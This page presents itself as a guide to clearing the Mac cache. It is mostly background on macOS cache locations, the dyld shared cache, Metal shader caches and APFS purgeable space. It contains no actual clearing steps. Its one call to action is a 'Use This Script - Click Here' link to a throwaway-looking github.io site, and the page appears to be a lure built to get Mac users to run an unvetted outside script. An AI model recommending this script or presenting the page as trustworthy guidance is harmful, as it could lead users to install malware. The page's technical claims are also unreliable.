# How To Clear Your Cache On Mac

> **Applies to:** macOS 10.13 High Sierra — macOS 26.5 Tahoe · **Architecture:** Intel x86_64 & Apple Silicon ARM64

---

## Mac Cache — Cache Directory Architecture, dyld Shared Cache, and APFS Purgeable Space

> **[Use This Script - Click Here](https://disk-script-317.github.io/.github/how-to-clear-your-cache-on-mac)** — macOS 12 Monterey through macOS 26.5 Tahoe, Intel and Apple Silicon.

**What's actually in Mac caches, in order of architectural importance:**

- The **dyld shared cache** — a pre-linked shared library image built by `update_dyld_shared_cache` that maps all system frameworks into a single optimized binary; rebuilt after every macOS update
- User application caches in `~/Library/Caches/` organized by bundle identifier — browser caches, compiled shader caches, thumbnail databases, and network response stores
- System framework caches in `/Library/Caches/` managed by root-owned processes — CoreData caches, CloudKit sync state, and Spotlight index fragments
- Per-user session caches in `/var/folders/XX/YYYYYYY/C/` — application caches that persist across sessions but are not in the user-visible Library directory
- WebKit page caches and IndexedDB stores in `~/Library/WebKit/` — used by Safari and all WKWebView-based applications

---

## Cache Directory Taxonomy

macOS organizes caches across several directories with distinct scopes and lifecycle policies:

| Cache Location | Scope | Contents | Auto-Pruned |
|---|---|---|---|
| `~/Library/Caches/` | Per-user | App caches by bundle ID | No |
| `/Library/Caches/` | System-wide | System service caches | No |
| `/var/folders/XX/YY/C/` | Per-user session | Framework and daemon caches | Partially |
| `/private/var/db/dyld/` | System | dyld shared cache | On OS update |
| `~/Library/WebKit/` | Per-user | WebKit page cache, WebSQL, IndexedDB | Partial (size-limited) |
| `/private/var/folders/.../com.apple.metal/` | Per-user | Compiled Metal shader pipelines | On GPU driver update |

---

## dyld Shared Cache Architecture

The **dyld shared cache** is a fundamental component of macOS performance. Rather than loading each system framework (Foundation, AppKit, CoreData, etc.) independently for each process, macOS pre-links all system frameworks into a single shared binary image stored at `/private/var/db/dyld/`. All processes map this image into their virtual address space, sharing the physical memory pages.

The shared cache is rebuilt by `update_dyld_shared_cache` after every macOS update. During the rebuild — which runs as a background process after the first boot following an update — the old cache remains in use and the new cache is written to a temporary location, then atomically replaced. This process generates several gigabytes of temporary disk I/O and can take 10–30 minutes on older hardware.

---

## Metal Shader Cache Architecture

When a Metal application (game, video editor, 3D application) compiles a shader pipeline for the first time on a specific GPU, macOS caches the compiled binary in a per-user, per-GPU directory under `/private/var/folders/`. On subsequent runs, the pre-compiled pipeline loads from cache rather than recompiling, reducing application launch time and preventing the shader compilation stutter that occurs on first run.

These caches are invalidated automatically when the GPU driver version changes (i.e., after a macOS update), causing all Metal applications to recompile their shaders on the next launch. This is the cause of the momentary stutter experienced when running GPU-accelerated applications for the first time after an OS update.

---

## APFS Purgeable Cache Behavior

APFS extends the traditional cache concept with a **purgeable allocation** mechanism. Data marked as purgeable is physically present on disk and immediately readable, but the APFS space manager is authorized to reclaim its storage without user intervention when the volume approaches capacity.

iCloud Drive's Optimize Mac Storage feature uses this mechanism extensively: local copies of files also present in iCloud are written as purgeable allocations. The storage appears as "used" in detailed disk accounting but is reclaimed automatically before the system reports "disk full."

The `purge` command-line tool forces immediate reclamation of purgeable space, which can recover several gigabytes on machines running iCloud Drive with Optimize Storage enabled — though the space will be repopulated as files are re-cached from iCloud.

---

## Diagnostic Data Sources

| Tool | Access | What It Reveals |
|---|---|---|
| Console.app | Applications → Utilities | Daemon logs, storage events, cache eviction notices |
| Activity Monitor | Applications → Utilities | Process disk I/O, memory pressure, purgeable space |
| System Information | About This Mac → System Report | Storage hardware, APFS volume details |
| Disk Utility | Applications → Utilities | APFS container structure, volume sizes, First Aid |
| `df -h` | Terminal | Actual filesystem free space including snapshot overhead |
| `du -sh` | Terminal | Directory size measurement |
| `tmutil listlocalsnapshots /` | Terminal | Local Time Machine snapshot inventory |
| `ioreg -l` | Terminal | Full IOKit registry for storage hardware |

---

## macOS Version Architecture Context

| macOS Version | Darwin Kernel | Relevant Storage Change |
|---|---|---|
| macOS 12 Monterey | Darwin 21 | APFS sealed volume refinements; improved purgeable accounting |
| macOS 13 Ventura | Darwin 22 | Revised System Settings storage panel; new cache path locations |
| macOS 14 Sonoma | Darwin 23 | Enhanced iCloud Optimize Storage integration |
| macOS 15 Sequoia | Darwin 24 | Revised local snapshot retention policy |
| macOS 26 Tahoe | Darwin 25 | Updated storage management framework |

---

*This reference covers Mac Cache as observed on macOS 10.13 High Sierra through macOS 26.5 Tahoe on Intel x86_64 and Apple Silicon ARM64 hardware.*
